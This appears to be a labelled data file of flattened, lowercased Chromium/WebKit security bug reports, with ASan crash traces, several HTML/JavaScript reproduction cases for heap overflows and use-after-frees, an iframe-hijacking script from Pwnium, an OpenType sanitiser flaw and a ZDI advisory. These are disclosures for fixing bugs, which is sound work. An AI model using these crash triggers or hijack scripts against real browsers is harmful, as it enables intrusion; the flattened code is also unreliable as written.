media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlinebox.h:185 6 in webcore inlineflowbox nextlinebox const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlineflowbox.h:73 7 in webcore renderblock paintcontents webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2571 8 in webcore renderobject document const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:550 9 in webcore renderblock paint webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2427 10 in graphicscontextstatesaver media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/graphics/graphicscontext.h:564 11 in webcore renderobject nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:144 12 in webcore renderobject nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:144 13 in webcore rendersvgroot paintreplaced webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/rendersvgroot.cpp:264 14 in webcore renderreplaced paint webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderreplaced.cpp:152 15 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2919 16 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2801 17 in webcore renderlayer paintlist wtf vector webcore renderlayer 0ul webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2983 18 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2801 19 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2617 20 in webcore renderlayer containsdirtyoverlayscrollbars const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.h:557 21 in graphicscontextstatesaver media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/graphics/graphicscontext.h:564 22 in webcore renderwidget paint webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderwidget.cpp:290 23 in webcore inlinebox paint webcore paintinfo webcore intpoint const int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlinebox.cpp:231 24 in webcore inlinebox nextonline const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlinebox.h:185 25 in webcore rootinlinebox hasellipsisbox const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/rootinlinebox.h:95 26 in webcore inlineflowbox nextlinebox const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/inlineflowbox.h:73 27 in webcore renderblock paintcontents webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2571 28 in webcore renderobject document const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:550 29 in webcore renderblock paint webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2427 30 in webcore renderobject renderobjectbitfields childreninline const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:979 31 in webcore renderblock paintcontents webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2574 32 in webcore renderobject document const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:550 33 in webcore renderblock paint webcore paintinfo webcore intpoint const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderblock.cpp:2427 34 in webcore renderlayer paintlayercontents webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2919 35 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2801 36 in webcore renderlayer paintlist wtf vector webcore renderlayer 0ul webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2983 37 in webcore renderlayer paintlayer webcore renderlayer webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2801 38 in webcore renderlayer paint webcore graphicscontext webcore intrect const unsigned int webcore renderobject webcore renderregion unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.cpp:2617 39 in webcore renderlayer containsdirtyoverlayscrollbars const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderlayer.h:557 40 in graphicscontextstatesaver media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/graphics/graphicscontext.h:564 41 in webkit webframeimpl paintwithcontext webcore graphicscontext webkit webrect const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:2084 42 in graphicscontextbuilder media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/painting/graphicscontextbuilder.h:63 43 in webkit webviewimpl paint skcanvas webkit webrect const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1240 44 in renderwidget paintrect gfx rect const gfx point const skia platformcanvas media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:617 45 in std vector gfx rect std allocator gfx rect size const usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/stl_vector.h:533 46 in scoped_ptr ipc message get const media/chromium/chromium/depot_tools/src/./base/memory/scoped_ptr.h:175 47 in bool ipc message dispatch renderwidget renderwidget ipc message const renderwidget renderwidget void renderwidget media/chromium/chromium/depot_tools/src/./ipc/ipc_message.h:137 48 in renderviewimpl onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_view_impl.cc:764 49 in messagerouter routemessage ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:46 50 in messagerouter onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:39 51 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:202 52 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 53 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 54 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 55 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 56 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 57 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1949266029 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 58 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 59 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 60 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 61 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:457 62 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 63 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 is located 0 bytes to the right of 34-byte region allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/fastmalloc.cpp:268 2 in wtf stringimpl createuninitialized unsigned int unsigned short media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/text/stringimpl.cpp:110 3 in wtf passrefptr wtf stringimpl leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 4 in webcore characterdata deletedata unsigned int unsigned int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/characterdata.cpp:129 5 in webcore deletefromtextnodecommand doapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/deletefromtextnodecommand.cpp:63 6 in webcore compositeeditcommand applycommandtocomposite wtf passrefptr webcore editcommand media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/compositeeditcommand.cpp:256 7 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 8 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 9 in webcore deleteselectioncommand handlegeneraldelete media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/deleteselectioncommand.cpp:443 10 in webcore deleteselectioncommand doapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/deleteselectioncommand.cpp:823 11 in webcore compositeeditcommand applycommandtocomposite wtf passrefptr webcore editcommand media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/compositeeditcommand.cpp:256 12 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 13 in webcore typingcommand setsmartdelete bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/typingcommand.h:94 14 in void wtf derefifnotnull webcore typingcommand webcore typingcommand media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 15 in webcore executedelete webcore frame webcore event webcore editorcommandsource wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:321 16 in webcore editor command execute wtf string const webcore event const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:1665 17 in webcore document execcommand wtf string const bool wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4174 18 in webcore documentinternal execcommandcallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8document.cpp:1503 19 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 20 21 7067 aborting stats 13m malloced 14m for red zones by 44093 calls stats 2m realloced by 2067 calls stats 11m freed by 33236 calls stats 0m really freed by 0 calls stats 60m 15369 full pages mmaped in 15 calls mmaps by size class 8:49149 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 18:16 19:8 21:2 mallocs by size class 8:35812 9:4615 10:2070 11:775 12:339 13:253 14:157 15:39 16:15 17:12 18:2 19:3 21:1 frees by size class 8:26153 9:4031 10:1785 11:566 12:279 13:226 14:143 15:32 16:8 17:7 18:2 19:3 21:1 rfrees by size class stats malloc large 18 small slow 193 shadow byte and word 2 00 00 00 00 02 fb fb fb more shadow bytes 00 00 00 00 06 fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 02 fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
heap-buffer-overflow in webcore previousboundary vulnerability details webkit-text-security first-letter webkit-user-modify read-only buffer-overflow version chrome version stable beta dev chromium 19.0.1040.0 developer build 121661 os linux webkit 535.21 107445 operating system 64bit linux reproduction case more as larger buffer html head style el0 webkit-text-security circle el0 first-letter display table-row-group el2 webkit-user-modify read-only display table el2 last-child display table-row style script onload function el0 document.createelement div document.body.appendchild el0 el0.setattribute id el0 el1 document.createelement q el0.appendchild el1 el2 document.createelement div el2.setattribute id el2 el0.appendchild el2 el1.appendchild document.createtextnode array 100 join a document.designmode='on document.execcommand selectall document.execcommand removeformat el2.appendchild document.createelement div document.execcommand selectall document.execcommand inserttext false a document.execcommand undo el0.appendchild document.createelement div document.execcommand selectall script head body body html for crashes please include the following additional information type of crash renderer asan crash state 18035 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in wtf stringimpl create unsigned short const unsigned int 0 1 in wtf string string unsigned short const unsigned int 0 2 in webcore previousboundary webcore visibleposition const unsigned int unsigned short const unsigned int unsigned int webcore boundarysearchcontextavailability bool third_party/webkit/source/webcore/editing/visible_units.cpp:0 is located 61 bytes to the left of 32-byte region freed by thread t0 here 0 in free 0 1 in webcore kurlgoogleprivate kurlgoogleprivate 0 2 in webcore documentloader documentloader 0	11
security ssl proxy seems to not care about the cert this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details cert mismatch for ssl proxies appears to be ignored by chrome version i think all version on all oses but only tested linux and mac reproduction case point your proxy to the cert is google.com which does not match yet the proxy works just fine for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above	9
security off-by-one in ots resulting in arbitrary code execution vulnerability details there s an off-by-one vulnerability in opentype sanitiser the bug was found using addresssanitizer see the following code from src/gpos.cc cut 30 gpos_type_reserved 10 60 const ots lookupsubtableparser typeparser kgpostypeparsers 61 gpos_type_single_adjustment parsesingleadjustment 62 gpos_type_pair_adjustment parsepairadjustment 63 gpos_type_cursive_attachment parsecursiveattachment 64 gpos_type_mark_to_base_attachment parsemarktobaseattachment 65 gpos_type_mark_to_ligature_attachment parsemarktoligatureattachment 66 gpos_type_mark_to_mark_attachment parsemarktomarkattachment 67 gpos_type_context_positioning parsecontextpositioning 68 gpos_type_chained_context_positioning parsechainedcontextpositioning 69 gpos_type_extension_positioning parseextensionpositioning 70 71 72 const ots lookupsubtableparser kgposlookupsubtableparser 73 gpos_type_reserved gpos_type_extension_positioning kgpostypeparsers 74 cut the kgpostypeparsers table has 9 items however a value of 10 gpos_type_reserved is used as the num_types value of the kgposlookupsubtableparser structure this can later lead to an out-of-bounds read and execution of an uninitialized function pointer from kgpostypeparsers 9 parser see src/layout.cc 1153 bool lookupsubtableparser parse const opentypefile file const uint8_t data 1154 const size_t length 1155 const uint16_t lookup_type const 1156 for unsigned i 0 i num_types i 1157 if parsers i type lookup_type parsers i parse 1158 if parsers i parse file data length 1159 return ots_failure 1160 1161 return true 1162 1163 1164 return ots_failure 1165 the vulnerable behavior can be potentially used to get a direct control over the application s execution flow log from asan 1119 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 ots lookupsubtableparser parse 1 anonymous namespace parselookuptable 2 ots parselookuplisttable 3 ots ots_gpos_parse 4 anonymous namespace processgeneric 5 anonymous namespace processttf 6 ots process 7 main 8 libc_start_main is located 0 bytes to the right of global variable zn12_global__n_1l16kgpostypeparserse ots/src/gpos.cc of size 144 1119 aborting stats 0m malloced 0m for red zones by 710 calls stats 0m realloced by 0 calls stats 0m freed by 29 calls stats 0m really freed by 0 calls stats 20m 5121 full pages mmaped in 5 calls mmaps by size class 8:16383 9:8191 10:4095 11:2047 17:32 mallocs by size class 8:696 9:9 10:3 11:1 17:1 frees by size class 8:26 9:2 10:1 rfrees by size class stats malloc large 1 small slow 5 shadow byte and word f9 00 00 00 00 00 00 f9 f9 more shadow bytes 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 00 00 f9 f9 f9 f9 f9 f9 00 00 f9 f9 version opentype sanitiser r82 any operating system or chrome version reproduction case see attachments they reproduce when used with ot-sanitise ot-sanitise dev/null 1015sn.otf.asan.5a.2	11
security do n't let a normal web renderer navigate to a privileged url issue 117230 showed a case that a normal web renderer was able to navigate to chrome net-internals and chrome downloads we have logic in renderviewhost filterurl that looks for reports that a renderer navigated somewhere it should n't have so we should add a check for this webui case as well as other privileged urls like extensions and apps	9
heap-use-after-free in webcore graphicscontext paintingdisabled repro-file as attachment version chrome version asan build 19.0.1063.0 operating system ubuntu 11.04 x86_64 13338 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in webcore graphicscontext paintingdisabled const 0 1 in webcore graphicscontext concatctm webcore affinetransform const 0 2 in webcore svgimagebuffertools cliptoimagebuffer webcore graphicscontext webcore affinetransform const webcore floatrect const wtf ownptr webcore imagebuffer 0 3 in webcore rendersvgresourceclipper applyclippingtocontext webcore renderobject webcore floatrect const webcore floatrect const webcore graphicscontext 0 4 in webcore rendersvgresourceclipper applyresource webcore renderobject webcore renderstyle webcore graphicscontext unsigned short 0 5 in webcore svgrendersupport preparetorendersvgcontent webcore renderobject webcore paintinfo 0 6 in webcore rendersvgshape paint webcore paintinfo webcore intpoint const 0 7 in webcore svgimagebuffertools rendersubtreetoimagebuffer webcore imagebuffer webcore renderobject webcore affinetransform const 0 8 in webcore rendersvgresourceclipper drawcontentintomaskimage webcore clipperdata webcore floatrect const 0 9 in webcore rendersvgresourceclipper applyclippingtocontext webcore renderobject webcore floatrect const webcore floatrect const webcore graphicscontext 0 10 in webcore rendersvgresourceclipper applyresource webcore renderobject webcore renderstyle webcore graphicscontext unsigned short 0 11 in webcore svgrendersupport preparetorendersvgcontent webcore renderobject webcore paintinfo 0 12 in webcore rendersvgshape paint webcore paintinfo webcore intpoint const 0 13 in webcore svgimagebuffertools rendersubtreetoimagebuffer webcore imagebuffer webcore renderobject webcore affinetransform const 0 14 in webcore rendersvgresourceclipper drawcontentintomaskimage webcore clipperdata webcore floatrect const 0 15 in webcore rendersvgresourceclipper applyclippingtocontext webcore renderobject webcore floatrect const webcore floatrect const webcore graphicscontext 0 16 in webcore rendersvgresourceclipper applyresource webcore renderobject webcore renderstyle webcore graphicscontext unsigned short 0 17 in webcore svgrendersupport preparetorendersvgcontent webcore renderobject webcore paintinfo 0 18 in webcore rendersvgshape paint webcore paintinfo webcore intpoint const 0 19 in webcore svgimagebuffertools rendersubtreetoimagebuffer webcore imagebuffer webcore renderobject webcore affinetransform const 0 54 in content contentmain int char const content contentmaindelegate 0 55 in chromemain 0 56 in main 0 57 in libc_start_main build/buildd/eglibc-2.13/csu/libc-start.c:258 is located 625874310 bytes to the rightasan sigsegv 13338 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in asan vsnprintf char int char const va_list_tag usr/local/google/chrome/src/third_party/llvm/projects/compiler-rt/lib/asan/asan_printf.cc:0 stats 4m malloced 7m for red zones by 24994 calls stats 0m realloced by 73 calls stats 2m freed by 12217 calls stats 0m really freed by 0 calls stats 44m 11270 full pages mmaped in 11 calls mmaps by size class 8:32766 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 mallocs by size class 8:21617 9:1648 10:1098 11:395 12:76 13:34 14:86 15:20 16:18 17:2 frees by size class 8:9724 9:1148 10:934 11:251 12:39 13:18 14:77 15:17 16:9 rfrees by size class stats malloc large 2 small slow 107	11
iframe hijacking from pwnium html script var popup context function step1 popup window.open null popup settimeout step2 1000 function step2 context popup.function popup.location settimeout step3 1000 function step3 context popup popup yva-iframe location data text/html 3cbody 3e 3cscript 3eframe=document.body.appendchild document.cr eateelement x22iframe\x22 frame.src=\x22 popup settimeout step4 2000 function step4 popup.location data text/html 3cscript 3ehistory.back 3c/script 3e script button onclick step1 go button html	5
heap-use-after-free in webcore renderlayer addchild vulnerability details bug version chrome version all operating system linux 64bit reproduction case html head style el1 nth-last-child 2 webkit-box-reflect left display run-in el2 height 1px el2 last-child webkit-box-reflect left style script onload function el1=document.createelement q document.body.appendchild el1 el1.setattribute id el1 el1.appendchild document.createelement input el2=document.createelement div document.body.appendchild el2 el2.setattribute id el2 document.body.appendchild document.createelement img document.designmode='on document.execcommand selectall document.execcommand formatblock false pre script head body body html and other variants for crashes please include the following additional information type of crash renderer crash state 2408 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 0 in webcore renderlayer removechild webcore renderlayer 0 1 in webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 0 is located 48 bytes inside of 296-byte region freed by thread t0 here 0 in free 0 1 in webcore renderboxmodelobject destroylayer 0 2 in webcore renderobject willbedestroyed 0 and others	11
heap-use-after-free in webcore inlinebox root this template is only for reporting security bugs please use a different template for other types of bug reports vulnerability details like 113902 but not fixed version chrome version dev and others chromium 19.0.1067.0 developer build 126075 os linux webkit 536.3 trunk 110387 javascript v8 3.9.13 operating system 64bit ubuntu reproduction case html head style el1 webkit-appearance list-button el2 height 1px el3 width 100px style script onload function el0 document.createelement div document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 el0.appendchild document.createtextnode a el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el3 document.createelement div el3.setattribute id el3 el1.appendchild el3 el3.appendchild document.createtextnode a el0.style.display='table-caption el1.style.display='table-footer-group el2.style.display='run-in el3.style.display='inline document.designmode='on document.execcommand selectall document.execcommand italic el1.style.display='run-in document.execcommand removeformat document.execcommand selectall document.execcommand italic el1.style.display='table-row document.body.offsettop el3.style.display='block script head body body html for crashes please include the following additional information type of crash renderer asan crash state 24495 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlinebox root 0 1 in webcore inlinetextbox localselectionrect int int 0 2 in webcore rendertext selectionrectforrepaint webcore renderboxmodelobject bool 0 is located 24 bytes inside of 152-byte region freed by thread t0 here 0 in free 0 1 in webcore renderlineboxlist deletelineboxes webcore renderarena 0 2 in webcore renderblock layoutinlinechildren bool int int 0 3 in webcore renderblock layoutblock bool int webcore renderblock blocklayoutpass 0	11
heap-use-after-free in webcore v8htmlbodyelement wrapslow detailed report fuzzer bj_doc_fuzzer crash type heap-use-after-free read 4 crash address crash state crash stack webcore v8htmlbodyelement wrapslow webcore createhtmlbodyelementwrapper free stack webcore event event webcore mutationevent mutationevent regressed minimized testcase 2.51 kb	11
zdi-can-1528 webkit htmlmedia element beforeload remote code execution vulnerability begin pgp signed message hash sha1 zdi-can-1528 webkit htmlmedia element beforeload remote code execution vulnerability cvss 7.5 av n/ac l/au n/c p/i p/a p abstract tippingpoint has identified a vulnerability affecting the following products webkit.org webkit vulnerability details version tested webkit r105551 platform tested windows xp sp3 webkit/source/webcore/html/htmlmediaelement.cpp kurl htmlmediaelement selectnextsourcechild contenttype contenttype invalidurlaction actionifinvalid node node htmlsourceelement source 0 for node firstchild canuse node node node nextsibling 1 source static_cast htmlsourceelement node 2 if issafetoloadurl mediaurl actionifinvalid dispatchbeforeloadevent mediaurl.string goto check_again if canuse if contenttype 3 contenttype contenttype source type 4 m_currentsourcenode source 5 m_nextchildnodetoconsider source nextsibling 1 source is a raw pointer just like node 2 beforeload event is raised we catch it with our handler and delete the source element 3,4,5 source is stale use after free credit this vulnerability was discovered by pa_kt twitter.com/pa_kt further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time security liaison zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used tippingpoint does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor tippingpoint provides its customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available furthermore with the altruistic aim of helping to secure a broader user base tippingpoint provides this vulnerability information confidentially to security vendors including competitors who have a vulnerability protection or mitigation product please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at begin pgp signature version gnupg v2.0.17 mingw32 iqecbaebagagbqjpyqunaaojefvtgmgto1sczo4h/rphsed5hoxcjqfvxo+msh3t 3rdgsyxz8mugq5zxc5vvukogz4cxlhkkgzfuyvrchbf4d2ycd6wbqizuntu0wkba 7fauky5bffe/pcbn5jg46s9eq0dqbxw2dxf8qninsqoy/jibacku02o4pc5xnhay 8r1gbxighpsorlq/j6tdefu9ucl1akyxqpjgdiyohjmpfk+kqtxrhvjuibhewhd3 tzlkhsyaahrcnbswec74ziler7e0mtbkb/mwwt30y5jnzrm5fmudbkxgekzx7wmo sqn5sydsiapdf6wqvloas2zfn6ak2ctggbbwbpwezlu9mkstdzlofz0dy52ale4 snz end pgp signature	11
open.call other_window circumvents check in other_window.open small fallout from pwnium repro d on 19.0.1061.0 liunx 64 html body button onclick='go click button script function go top.open script iframe src data text/html html body button onclick='go click button script function go top.open script body html iframe iframe src data text/html html body button onclick='go click button script function go open.call top script body html iframe body html clicking the first of the iframed buttons blocks top opening a new window with the security error unsafe javascript attempt to access frame clicking the second causes it to open possible missing security check in v8domwindowcustom.cpp secseverity really really low would have made sergey s life more difficult though	5
heap-use-after-free in webcore svgstyledelement buildpendingresourcesifneeded vulnerability details use after free happens when adding attribute to svg element from imported and adopted node version version 19.0.1068.0 126348 developer build on ubuntu 10.10 17.0.963.79 m win7 x64 reproduction case in attachment for crashes please include the following additional information 3489 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore svgstyledelement buildpendingresourcesifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledelement.cpp:384 1 in webcore svgstyledelement svgattributechanged webcore qualifiedname const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledelement.cpp:347 2 in invalidationguard media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgelementinstance.h:81 3 in webcore node document const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:400 4 in webcore elementattributedata addattribute wtf passrefptr webcore attribute webcore element webcore einupdatestyleattribute media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/elementattributedata.cpp:108 5 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:67 6 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 7 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 8 in v8 internal jsobject setpropertyforresult v8 internal lookupresult v8 internal string v8 internal object propertyattributes v8 internal strictmodeflag media/chromium/chromium/depot_tools/src/v8/src/objects.cc:3010 9 in v8 internal jsreceiver setproperty v8 internal string v8 internal object propertyattributes v8 internal strictmodeflag media/chromium/chromium/depot_tools/src/v8/src/objects.cc:2654 10 in v8 internal storeic store v8 internal inlinecachestate v8 internal strictmodeflag v8 internal handle v8 internal object v8 internal handle v8 internal string v8 internal handle v8 internal object 